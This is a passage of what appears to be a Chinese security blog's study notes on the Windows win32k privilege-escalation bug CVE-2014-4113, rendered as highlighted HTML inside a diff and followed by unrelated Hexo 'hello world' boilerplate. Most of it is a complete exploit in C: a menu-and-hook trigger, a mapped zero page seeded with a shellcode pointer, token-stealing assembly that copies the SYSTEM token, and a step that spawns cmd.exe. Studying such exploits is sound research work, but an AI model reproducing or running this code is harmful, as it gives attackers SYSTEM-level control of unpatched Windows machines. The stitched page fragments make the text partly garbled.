(*(DWORD*)(lParam + <span class="number">8</span>) == <span class="number">0x1EB</span>) &#123;	</span><br><span class="line">		<span class="keyword">if</span> (UnhookWindowsHook(WH_CALLWNDPROC, HookCallback)) &#123;</span><br><span class="line">			<span class="comment">//lparam+12 是一个指向窗口句柄的地址。在这里，我们将该窗口的回调函数设置为第二个回调函数 HookCallbackTwo</span></span><br><span class="line">			SetWindowLongA(*(HWND*)(lParam + <span class="number">12</span>), GWLP_WNDPROC, (LONG)HookCallbackTwo);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(<span class="number">0</span>, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">LRESULT WINAPI DefWindowProc(</span></span><br><span class="line"><span class="comment">_In_ HWND   hWnd,</span></span><br><span class="line"><span class="comment">_In_ UINT   Msg,</span></span><br><span class="line"><span class="comment">_In_ WPARAM wParam,</span></span><br><span class="line"><span class="comment">_In_ LPARAM lParam</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">hWnd =&gt; Handle of the Window the event was triggered on</span></span><br><span class="line"><span class="comment">Msg =&gt; Message, the event that has occurred, this could be that window has moved, has been minimized, clicked on etc</span></span><br><span class="line"><span class="comment">wParam, lParam =&gt; extra information depending on the msg recieved.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Wait until the window is idle and then send the messages needed to &#x27;click&#x27; on the submenu to trigger the bug</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] WindProc called with message=%d\n&quot;</span>, msg);</span><br><span class="line">	<span class="keyword">if</span> (msg == WM_ENTERIDLE) &#123;		<span class="comment">//此消息通知应用程序的主窗口过程，模式对话框或菜单已进入空闲状态。在处理了一个或多个以前的消息后消息队列中不再有消息，则称模式对话框或菜单进入空闲状态。</span></span><br><span class="line">		PostMessageA(hwnd, WM_KEYDOWN, VK_DOWN, <span class="number">0</span>);</span><br><span class="line">		PostMessageA(hwnd, WM_KEYDOWN, VK_RIGHT, <span class="number">0</span>);</span><br><span class="line">		PostMessageA(hwnd, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Just pass any other messages to the default window procedure</span></span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, msg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">Poc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">typedef struct tagWNDCLASS &#123;</span></span><br><span class="line"><span class="comment">UINT      style;										//窗口类的风格</span></span><br><span class="line"><span class="comment">WNDPROC   lpfnWndProc;									//窗口处理函数</span></span><br><span class="line"><span class="comment">int       cbClsExtra;									</span></span><br><span class="line"><span class="comment">int       cbWndExtra;</span></span><br><span class="line"><span class="comment">HINSTANCE hInstance;									//该窗口类所属的实例句柄</span></span><br><span class="line"><span class="comment">HICON     hIcon;</span></span><br><span class="line"><span class="comment">HCURSOR   hCursor;</span></span><br><span class="line"><span class="comment">HBRUSH    hbrBackground;</span></span><br><span class="line"><span class="comment">LPCTSTR   lpszMenuName;</span></span><br><span class="line"><span class="comment">LPCTSTR   lpszClassName;								//字符串形式的菜单名</span></span><br><span class="line"><span class="comment">&#125; WNDCLASS, *PWNDCLASS;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">	WNDCLASSA wnd_class = &#123; <span class="number">0</span> &#125;;						<span class="comment">//自定义窗口</span></span><br><span class="line">	<span class="comment">//Our custome WndProc handler, inspects any window messages before passing then onto the default handler</span></span><br><span class="line">	wnd_class.lpfnWndProc = WndProc;</span><br><span class="line">	<span class="comment">//Returns a handle to the executable that has the name passed to it, passing NULL means it returns a handle to this executable</span></span><br><span class="line">	wnd_class.hInstance = GetModuleHandle(<span class="literal">NULL</span>);		<span class="comment">//可以传入一个字符串参数，表示要获取的模块的名称或路径。如果参数值为 NULL，则返回当前进程的模块句柄。</span></span><br><span class="line">	<span class="comment">//Random classname - we reference this later when creating a Window of this class</span></span><br><span class="line">	wnd_class.lpszClassName = <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Registers the class in the global scope so it can be refered too later.</span></span><br><span class="line">	ATOM tmp = RegisterClassA(&amp;wnd_class);				<span class="comment">//先注册窗口类</span></span><br><span class="line">	<span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Failed to register window class.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Does what it says on the tin..</span></span><br><span class="line"><span class="comment">	HWND WINAPI CreateWindow(</span></span><br><span class="line"><span class="comment">	_In_opt_ LPCTSTR   lpClassName, =&gt; The name of the Window class to be created, in this case the class we just registered</span></span><br><span class="line"><span class="comment">	_In_opt_ LPCTSTR   lpWindowName, =&gt; The name to give the window, we don&#x27;t need to give it a name.</span></span><br><span class="line"><span class="comment">	_In_     DWORD     dwStyle, =&gt; Style options for the window, here</span></span><br><span class="line"><span class="comment">	_In_     int       x, =&gt; x position to create the window,this time the left edge</span></span><br><span class="line"><span class="comment">	_In_     int       y, =&gt; y position to create the window, this time the top edge</span></span><br><span class="line"><span class="comment">	_In_     int       nWidth, =&gt; Width of the window to create, randomly chosen value</span></span><br><span class="line"><span class="comment">	_In_     int       nHeight, =&gt; Height of the to create, randomly chosen value</span></span><br><span class="line"><span class="comment">	_In_opt_ HWND      hWndParent, =&gt; A handle to the parent window, this is our only window so NULL</span></span><br><span class="line"><span class="comment">	_In_opt_ HMENU     hMenu, =&gt; A handle to a menu or sub window to attach to the window, we havent created any yet.</span></span><br><span class="line"><span class="comment">	_In_opt_ HINSTANCE hInstance, =&gt; A handle to the module the window should be associated with, for us this executable</span></span><br><span class="line"><span class="comment">	_In_opt_ LPVOID    lpParam =&gt; A pointer to data to be passed to the Window with the WM_CREATE message on creation, NULL for us as we don&#x27;t wish to pass anything.</span></span><br><span class="line"><span class="comment">	);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">														<span class="comment">//再创建窗口类</span></span><br><span class="line">	HWND main_wnd = CreateWindowA(</span><br><span class="line">		wnd_class.lpszClassName,</span><br><span class="line">		<span class="string">&quot;&quot;</span>,</span><br><span class="line">		WS_OVERLAPPEDWINDOW | WS_VISIBLE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">640</span>,</span><br><span class="line">		<span class="number">480</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		wnd_class.hInstance,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (main_wnd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Failed to create window instance.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Creates an empty popup menu</span></span><br><span class="line">	HMENU MenuOne = CreatePopupMenu();					<span class="comment">//简单地创建了一个空的弹出式菜单</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (MenuOne == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Failed to create popup menu one.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*Menu properties to apply to the empty menu we just created</span></span><br><span class="line"><span class="comment">	typedef struct tagMENUITEMINFO &#123;</span></span><br><span class="line"><span class="comment">	UINT      cbSize;									//结构体大小，用于指定当前结构体的大小</span></span><br><span class="line"><span class="comment">	UINT      fMask;									//菜单项的掩码，用于指定要设置或获取的菜单项信息</span></span><br><span class="line"><span class="comment">	UINT      fType;</span></span><br><span class="line"><span class="comment">	UINT      fState;</span></span><br><span class="line"><span class="comment">	UINT      wID;</span></span><br><span class="line"><span class="comment">	HMENU     hSubMenu;</span></span><br><span class="line"><span class="comment">	HBITMAP   hbmpChecked;</span></span><br><span class="line"><span class="comment">	HBITMAP   hbmpUnchecked;</span></span><br><span class="line"><span class="comment">	ULONG_PTR dwItemData;</span></span><br><span class="line"><span class="comment">	LPTSTR    dwTypeData;</span></span><br><span class="line"><span class="comment">	UINT      cch;</span></span><br><span class="line"><span class="comment">	HBITMAP   hbmpItem;</span></span><br><span class="line"><span class="comment">	&#125; MENUITEMINFO, *LPMENUITEMINFO;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	MENUITEMINFOA MenuOneInfo = &#123; <span class="number">0</span> &#125;;		</span><br><span class="line">	<span class="comment">//Default size</span></span><br><span class="line">	MenuOneInfo.cbSize = <span class="keyword">sizeof</span>(MENUITEMINFOA);			<span class="comment">//在 32 位系统下，sizeof(MENUITEMINFOA) 的值为 48；在 64 位系统下，sizeof(MENUITEMINFOA) 的值为 72</span></span><br><span class="line">	<span class="comment">//Selects what properties to retrieve or set when GetMenuItemInfo/SetMenuItemInfo are called, in this case only dwTypeData which the contents of the menu item.</span></span><br><span class="line">	MenuOneInfo.fMask = MIIM_STRING;					<span class="comment">//用于指示菜单项的文本属性是否有效</span></span><br><span class="line">	<span class="comment">//当设置了 MIIM_STRING 标志时，表示菜单项的 dwTypeData 字段所指向的缓冲区包含了菜单项的文本内容；否则，dwTypeData 字段所指向的缓冲区中没有文本内容</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*Inserts a new menu at the specified position</span></span><br><span class="line"><span class="comment">	BOOL WINAPI InsertMenuItem(</span></span><br><span class="line"><span class="comment">	_In_ HMENU           hMenu,							要插入新菜单项的菜单句柄</span></span><br><span class="line"><span class="comment">	_In_ UINT            uItem,							指定在菜单中插入新菜单项的位置，如果 fByPosition 参数为 TRUE 则此参数为菜单位置，否则为菜单项标识符</span></span><br><span class="line"><span class="comment">	_In_ BOOL            fByPosition,					指示 uItem 参数是菜单位置还是菜单项标识符，如果此参数为 TRUE，则 uItem 将被视为菜单位置，否则将其视为菜单项标识符</span></span><br><span class="line"><span class="comment">	_In_ LPCMENUITEMINFO lpmii							指向 MENUITEMINFO 结构的指针，其中包含有关新菜单项的信息</span></span><br><span class="line"><span class="comment">	);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	BOOL insertMenuItem = InsertMenuItemA(MenuOne, <span class="number">0</span>, TRUE, &amp;MenuOneInfo);		<span class="comment">//用于在菜单中插入新的菜单项</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!insertMenuItem) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Failed to insert popup menu one.\n&quot;</span>);</span><br><span class="line">		DestroyMenu(MenuOne);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	HMENU MenuTwo = CreatePopupMenu();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (MenuTwo == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Failed to create menu two.\n&quot;</span>);</span><br><span class="line">		DestroyMenu(MenuOne);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	MENUITEMINFOA MenuTwoInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	MenuTwoInfo.cbSize = <span class="keyword">sizeof</span>(MENUITEMINFOA);</span><br><span class="line">	<span class="comment">//On this window hSubMenu should be included in Get/SetMenuItemInfo</span></span><br><span class="line">	MenuTwoInfo.fMask = (MIIM_STRING | MIIM_SUBMENU);	<span class="comment">//MENUITEMINFO 结构体的 dwTypeData 成员包含项的字符串，而 hSubMenu 成员包含在选择该项时显示的子菜单的句柄</span></span><br><span class="line">	<span class="comment">//The menu is a sub menu of the first menu</span></span><br><span class="line">	MenuTwoInfo.hSubMenu = MenuOne;						<span class="comment">//如果菜单项是弹出式子菜单，则该字段指向子菜单的句柄</span></span><br><span class="line">	<span class="comment">//The contents of the menu item - in this case nothing</span></span><br><span class="line">	MenuTwoInfo.dwTypeData = (LPSTR)<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="comment">//The length of the menu item text - in the case 1 for just a single NULL byte</span></span><br><span class="line">	MenuTwoInfo.cch = <span class="number">1</span>;								<span class="comment">//菜单项名称或文本内容的长度</span></span><br><span class="line">	insertMenuItem = InsertMenuItemA(MenuTwo, <span class="number">0</span>, TRUE, &amp;MenuTwoInfo);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!insertMenuItem) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Failed to insert second pop-up menu.\n&quot;</span>);</span><br><span class="line">		DestroyMenu(MenuOne);</span><br><span class="line">		DestroyMenu(MenuTwo);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	HHOOK WINAPI SetWindowsHookEx(</span></span><br><span class="line"><span class="comment">	_In_ int       idHook,			钩子类型</span></span><br><span class="line"><span class="comment">	_In_ HOOKPROC  lpfn,			处理过程</span></span><br><span class="line"><span class="comment">	_In_ HINSTANCE hMod,			DLL 句柄</span></span><br><span class="line"><span class="comment">	_In_ DWORD     dwThreadId		线程 ID</span></span><br><span class="line"><span class="comment">	);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	HHOOK setWindowsHook = SetWindowsHookExA(</span><br><span class="line">		WH_CALLWNDPROC,				<span class="comment">//用于监视和处理其他应用程序中的窗口过程调用,当钩子被安装后，每次目标窗口的窗口函数被调用时，会在系统中创建一个钩子回调函数</span></span><br><span class="line">		HookCallback,										</span><br><span class="line">		<span class="literal">NULL</span>,						</span><br><span class="line">		GetCurrentThreadId()		<span class="comment">//当前线程</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (setWindowsHook == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Failed to insert call back one.\n&quot;</span>);</span><br><span class="line">		DestroyMenu(MenuOne);		<span class="comment">//它用于删除指定菜单并释放与其相关联的所有系统资源</span></span><br><span class="line">		DestroyMenu(MenuTwo);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Displays a menu and tracks interactions with it.</span></span><br><span class="line"><span class="comment">	BOOL WINAPI TrackPopupMenu(					用于在指定的窗口上下文菜单中显示并跟踪用户输入，直到用户选择了菜单项或取消了弹出菜单</span></span><br><span class="line"><span class="comment">	_In_           HMENU hMenu,					参数指定要显示的菜单句柄</span></span><br><span class="line"><span class="comment">	_In_           UINT  uFlags,				参数指定控制菜单的行为和外观的标志</span></span><br><span class="line"><span class="comment">	_In_           int   x,						参数指定显示菜单的位置</span></span><br><span class="line"><span class="comment">	_In_           int   y,</span></span><br><span class="line"><span class="comment">	_In_           int   nReserved,				参数当前未使用，必须设置为0</span></span><br><span class="line"><span class="comment">	_In_           HWND  hWnd,					参数指定要将菜单附加到的窗口句柄</span></span><br><span class="line"><span class="comment">	_In_opt_ const RECT  *prcRect				参数指向包含矩形的结构体，其中该菜单应该被限制。如果该参数为NULL，则菜单不会被限制</span></span><br><span class="line"><span class="comment">	);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	TrackPopupMenu(	<span class="comment">//用于显示窗口菜单并等待用户选择菜单项</span></span><br><span class="line">		MenuTwo, <span class="comment">//Handle to the menu we want to display, for us its the submenu we just created.	要显示的菜单句柄</span></span><br><span class="line">		<span class="number">0</span>,		 <span class="comment">//Options on how the menu is aligned, what clicks are allowed etc, we don&#x27;t care.</span></span><br><span class="line">		<span class="number">0</span>,		 <span class="comment">//Horizontal position - left hand side</span></span><br><span class="line">		<span class="number">0</span>,		 <span class="comment">//Vertical position - Top edge</span></span><br><span class="line">		<span class="number">0</span>,		 <span class="comment">//Reserved field, has to be 0</span></span><br><span class="line">		main_wnd,<span class="comment">//Handle to the Window which owns the menu		菜单所属的窗口句柄</span></span><br><span class="line">		<span class="literal">NULL</span>	 <span class="comment">//This value is always ignored...</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	DestroyWindow(main_wnd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __stdcall <span class="title function_">ShellCode</span><span class="params">(<span class="type">int</span> parameter1, <span class="type">int</span> parameter2, <span class="type">int</span> parameter3, <span class="type">int</span> parameter4)</span></span><br><span class="line">&#123;</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		Int <span class="number">3</span></span><br><span class="line">		pushad</span><br><span class="line">		mov eax, fs: [<span class="number">124</span>h]		<span class="comment">// 利用 fs 寄存器获取当前线程的 KTHREAD 结构体</span></span><br><span class="line">		mov eax, [eax + <span class="number">0x50</span>]   <span class="comment">// 根据其中的成员变量找到当前进程的 EPROCESS 结构体</span></span><br><span class="line">		mov ecx, eax</span><br><span class="line">		mov edx, <span class="number">4</span>				<span class="comment">// edx = system PID(4)</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//进程ID为4的进程通常是系统守护程序（system）</span></span><br><span class="line">		find_sys_pid :</span><br><span class="line">		mov eax, [eax + <span class="number">0xb8</span>]	<span class="comment">// 遍历下一个EPROCESS 结构体</span></span><br><span class="line">		sub eax, <span class="number">0xb8</span>    		<span class="comment">// 回到EPROCESS 结构体的基址</span></span><br><span class="line">		cmp[eax + <span class="number">0xb4</span>], edx    <span class="comment">// 比较pid</span></span><br><span class="line">		jnz find_sys_pid</span><br><span class="line"></span><br><span class="line">		<span class="comment">//替换Token</span></span><br><span class="line">		mov edx, [eax + <span class="number">0xf8</span>]</span><br><span class="line">		mov[ecx + <span class="number">0xf8</span>], edx</span><br><span class="line">		Int <span class="number">3</span></span><br><span class="line">		popad</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> VOID <span class="title function_">CreateCmd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="keyword">sizeof</span>(si) &#125;;					<span class="comment">//用于指定新进程的属性</span></span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">	si.wShowWindow = SW_SHOW;</span><br><span class="line">	WCHAR wzFilePath[MAX_PATH] = &#123; <span class="string">L&quot;cmd.exe&quot;</span> &#125;;</span><br><span class="line">	BOOL bReturn = CreateProcessW(<span class="literal">NULL</span>, wzFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOW)&amp;si, &amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">用于创建并启动一个新的命令行窗口（cmd.exe）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">具体来说，它使用了Windows API中的CreateProcessW函数来创建一个新进程，参数说明如下：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第一个参数为lpApplicationName，表示要启动的可执行文件的名称。在本例中，该参数设置为NULL，表示使用系统默认的可执行文件 cmd.exe。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第二个参数为lpCommandLine，表示要传递给新进程的命令行参数。在本例中，该参数设置为可执行文件名称 cmd.exe，因为不需要向新进程传递任何参数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第三个参数为lpProcessAttributes，表示新进程的安全属性。在本例中，该参数设置为NULL，表示使用默认的安全属性。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第四个参数为lpThreadAttributes，表示新线程的安全属性。在本例中，该参数设置为NULL，表示使用默认的安全属性。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第五个参数为bInheritHandles，表示新进程是否继承当前进程的句柄。在本例中，该参数设置为FALSE，表示新进程不会继承当前进程的句柄。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第六个参数为dwCreationFlags，表示新进程的创建标志。在本例中，该参数设置为CREATE_NEW_CONSOLE，表示新进程应该在新的控制台窗口中运行。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第七个参数为lpEnvironment，表示新进程的环境变量。在本例中，该参数设置为NULL，表示使用当前进程的环境变量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第八个参数为lpCurrentDirectory，表示新进程的初始工作目录。在本例中，该参数设置为NULL，表示使用与当前进程相同的工作目录。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第九个参数为lpStartupInfo，表示指向STARTUPINFO结构体的指针，用于指定新进程的属性，例如窗口大小、图标等。在本例中，该参数设置了一个默认的STARTUPINFO结构体。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第十个参数为lpProcessInformation，表示指向PROCESS_INFORMATION结构体的指针，用于接收新进程的相关信息，例如进程句柄、线程句柄等。在本例中，该参数被传递给CreateProcessW函数，用于接收新进程的信息。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">如果CreateProcessW函数调用成功，它将返回一个非零值，并且通过参数pi来传递新进程和新线程的句柄，我们需要关闭这两个句柄以释放系统资源。若失败，则会返回0。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD __stdcall  <span class="title function_">ptiCurrent</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		mov eax, fs:<span class="number">18</span>h		 <span class="comment">//eax pointer to TEB</span></span><br><span class="line">		mov eax, [eax + <span class="number">40</span>h] <span class="comment">//get pointer to Win32ThreadInfo</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	FARPROC GetProcAddress(</span></span><br><span class="line"><span class="comment">		 HMODULE hModule,										hModule参数是指向要从中获取函数地址的模块的句柄</span></span><br><span class="line"><span class="comment">		 LPCSTR lpProcName										lpProcName参数是要获取的函数的名称</span></span><br><span class="line"><span class="comment">	);</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	*(FARPROC*)&amp;NtAllocateVirtualMemory = GetProcAddress(		<span class="comment">//用于在动态链接库（DLL）中查找指定的导出函数，并返回该函数在内存中的地址</span></span><br><span class="line">		GetModuleHandleW(<span class="string">L&quot;ntdll&quot;</span>),</span><br><span class="line">		<span class="string">&quot;NtAllocateVirtualMemory&quot;</span>);</span><br><span class="line">	<span class="comment">//NtAllocateVirtualMemory函数本身并没有导出到Win32 API中，它是Windows内部使用的一个系统调用，通常由驱动程序、DLL或者其他内核模块来调用。因此，在使用NtAllocateVirtualMemory函数时，需要先通过一些低级API获取NT内核的句柄，然后再调用NtAllocateVirtualMemory函数来完成内存分配的操作。</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (NtAllocateVirtualMemory == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Failed to get function NtAllocateVirtualMemory!!!\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PVOID Zero_addr = (PVOID)<span class="number">1</span>;							<span class="comment">//PVOID表示未知类型的指针</span></span><br><span class="line">	SIZE_T RegionSize = <span class="number">0x1000</span>;							<span class="comment">//SIZE_T是一个无符号整数类型</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Started to alloc zero page...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(NtAllocateVirtualMemory(			<span class="comment">//检查返回值是否为STATUS_SUCCESS,NtAllocateVirtualMemory用于在进程的虚拟地址空间中分配内存区域</span></span><br><span class="line">		INVALID_HANDLE_VALUE,							<span class="comment">//表示要分配内存的目标是当前进程</span></span><br><span class="line">		&amp;Zero_addr,										<span class="comment">//用于返回分配得到的内存的基地址</span></span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;RegionSize,									<span class="comment">//用于返回分配得到的内存的大小</span></span><br><span class="line">		MEM_COMMIT | MEM_RESERVE,						<span class="comment">//表示将内存保留并提交</span></span><br><span class="line">		PAGE_READWRITE)) || Zero_addr != <span class="literal">NULL</span>)			<span class="comment">//表示分配的内存块是可读可写的</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Failed to alloc zero page!\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Success to alloc zero page...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	*(DWORD*)(<span class="number">0x3</span>) = (DWORD)ptiCurrent();				<span class="comment">//返回Win32ThreadInfo结构体</span></span><br><span class="line">	*(DWORD*)(<span class="number">0x11</span>) = (DWORD)<span class="number">4</span>;							<span class="comment">//修改线程 ID为4</span></span><br><span class="line">	*(DWORD*)(<span class="number">0x5b</span>) = (DWORD)&amp;ShellCode;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line"></span><br><span class="line">	Poc();</span><br><span class="line"></span><br><span class="line">	CreateCmd();</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+More info: Writing
+Run server1$ hexo server
 
+More info: Server
+Generate static files1$ hexo generate
 
+More info: Generating
+Deploy to remote sites1$ hexo deploy
 
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/05/31/CVE-2014-4113%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="cliahxewt0000iwti3mjsew1b" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/05/26/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2023-05-26T15:41:34.729Z" itemprop="datePublished">2023-05-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/05/26/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
